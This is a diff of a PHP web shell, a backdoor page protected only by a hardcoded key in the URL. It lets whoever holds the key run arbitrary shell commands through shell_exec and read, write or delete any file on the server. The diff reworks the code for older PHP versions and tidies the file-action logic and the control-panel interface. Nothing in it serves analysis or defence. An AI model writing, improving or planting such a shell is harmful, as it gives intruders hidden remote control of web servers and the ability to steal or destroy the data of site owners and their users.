@@ -1,12 +1,15 @@
 <?php
 @error_reporting(0);
 $key = 'ayam';
-if (($_GET['k'] ?? $_GET['key'] ?? '') !== $key) { http_response_code(403); exit; }
+$gk = isset($_GET['k']) ? $_GET['k'] : (isset($_GET['key']) ? $_GET['key'] : '');
+if ($gk !== $key) { http_response_code(403); exit; }
 
-$cwd = isset($_POST['cwd']) && is_dir($_POST['cwd']) ? $_POST['cwd'] : getcwd();
+$cwd = (isset($_POST['cwd']) && is_dir($_POST['cwd'])) ? $_POST['cwd'] : getcwd();
 $out = '';
+$mode = '';
 
 if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
+    $mode = 'cmd';
     $cmd = $_POST['cmd'];
     if (function_exists('shell_exec')) {
         $out = shell_exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
@@ -24,28 +27,27 @@ if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
 }
 
 if (isset($_POST['action'])) {
-    $action = $_POST['action'];
-    $path   = $_POST['path'] ?? '';
+    $mode = 'file';
+    $action  = $_POST['action'];
+    $path    = isset($_POST['path']) ? $_POST['path'] : '';
+    $content = isset($_POST['content']) ? $_POST['content'] : '';
 
     if ($action === 'read' && $path) {
         $out = @file_get_contents($path);
         if ($out === false) $out = 'Cannot read: ' . $path;
-    }
-    if ($action === 'write' && $path) {
-        $content = $_POST['content'] ?? '';
+    } elseif ($action === 'write' && $path) {
         $ok = @file_put_contents($path, $content);
-        $out = $ok !== false ? 'Written ' . $ok . ' bytes' : 'Write failed: ' . $path;
-    }
-    if ($action === 'delete' && $path) {
+        $out = ($ok !== false) ? 'Written ' . $ok . ' bytes' : 'Write failed: ' . $path;
+    } elseif ($action === 'delete' && $path) {
         $out = @unlink($path) ? 'Deleted' : 'Delete failed';
     }
 }
 
-$host    = php_uname('n');
-$user    = function_exists('get_current_user') ? get_current_user() : '?';
-$phpver  = PHP_VERSION;
-$self    = $_SERVER['PHP_SELF'];
-$keyval  = htmlspecialchars($_GET['k'] ?? $_GET['key'] ?? $key);
+$host   = @php_uname('n');
+$user   = function_exists('get_current_user') ? get_current_user() : '?';
+$phpver = PHP_VERSION;
+$fpath  = isset($_POST['path']) ? $_POST['path'] : '';
+$fcont  = isset($_POST['content']) ? $_POST['content'] : '';
 ?><!DOCTYPE html>
 <html>
 <head>
@@ -57,7 +59,7 @@ body{background:#0d0d0d;color:#e0e0e0;font:13px/1.5 monospace;padding:12px}
 .bar{background:#1a1a1a;border:1px solid #333;padding:6px 10px;margin-bottom:8px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
 .bar span{color:#888;font-size:11px}
 .bar b{color:#4fc3f7}
-input,textarea{background:#111;border:1px solid #333;color:#e0e0e0;font:13px monospace;padding:5px 8px;outline:none}
+input,textarea,select{background:#111;border:1px solid #333;color:#e0e0e0;font:13px monospace;padding:5px 8px;outline:none}
 input:focus,textarea:focus{border-color:#555}
 .cmd-row{display:flex;gap:6px;margin-bottom:8px}
 .cmd-row input{flex:1}
@@ -66,7 +68,7 @@ button:hover{background:#2a2a2a;border-color:#666}
 .out{background:#111;border:1px solid #2a2a2a;padding:8px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;margin-bottom:8px;font-size:12px}
 .tabs{display:flex;gap:4px;margin-bottom:8px}
 .tab{padding:4px 12px;cursor:pointer;border:1px solid #333;background:#1a1a1a;color:#888}
-.tab.active{background:#222;color:#e0e0e0;border-bottom-color:#222}
+.tab.active{background:#222;color:#e0e0e0}
 .sec{display:none}.sec.active{display:block}
 .row{display:flex;gap:6px;margin-bottom:6px;align-items:center}
 .row label{color:#888;font-size:11px;width:60px;flex-shrink:0}
@@ -95,7 +97,7 @@ textarea.big{width:100%;height:220px;resize:vertical}
       <input type="text" name="cmd" id="cmd" placeholder="command..." autofocus autocomplete="off">
       <button type="submit">Run</button>
     </div>
-    <?php if ($out !== '' && isset($_POST['cmd'])): ?>
+    <?php if ($mode === 'cmd' && $out !== ''): ?>
     <div class="out"><?php echo htmlspecialchars($out); ?></div>
     <?php endif; ?>
   </form>
@@ -104,27 +106,32 @@ textarea.big{width:100%;height:220px;resize:vertical}
 <div id="files" class="sec">
   <form method="post">
     <p class="info">Read / Write / Delete files by absolute path</p>
-    <div class="row"><label>Path</label><input type="text" name="path" value="<?php echo htmlspecialchars($_POST['path'] ?? ''); ?>" placeholder="/var/www/..."></div>
+    <div class="row">
+      <label>Path</label>
+      <input type="text" name="path" value="<?php echo htmlspecialchars($fpath); ?>" placeholder="/var/www/...">
+    </div>
     <div class="row">
       <label>Action</label>
-      <select name="action" style="background:#111;border:1px solid #333;color:#e0e0e0;padding:5px;font:13px monospace">
+      <select name="action">
         <option value="read">Read</option>
         <option value="write">Write</option>
         <option value="delete">Delete</option>
       </select>
       <button type="submit">Go</button>
     </div>
-    <?php if ($out !== '' && isset($_POST['action'])): ?>
+    <?php if ($mode === 'file' && $out !== ''): ?>
     <div class="out"><?php echo htmlspecialchars($out); ?></div>
     <?php endif; ?>
-    <textarea class="big" name="content" placeholder="file content (for write)"><?php echo htmlspecialchars($_POST['content'] ?? ''); ?></textarea>
+    <textarea class="big" name="content" placeholder="file content (for write)"><?php echo htmlspecialchars($fcont); ?></textarea>
   </form>
 </div>
 
 <script>
 function sw(id,el){
-  document.querySelectorAll('.sec').forEach(function(s){s.classList.remove('active')});
-  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active')});
+  var secs=document.querySelectorAll('.sec');
+  var tabs=document.querySelectorAll('.tab');
+  for(var i=0;i<secs.length;i++) secs[i].classList.remove('active');
+  for(var i=0;i<tabs.length;i++) tabs[i].classList.remove('active');
   document.getElementById(id).classList.add('active');
   el.classList.add('active');
 }
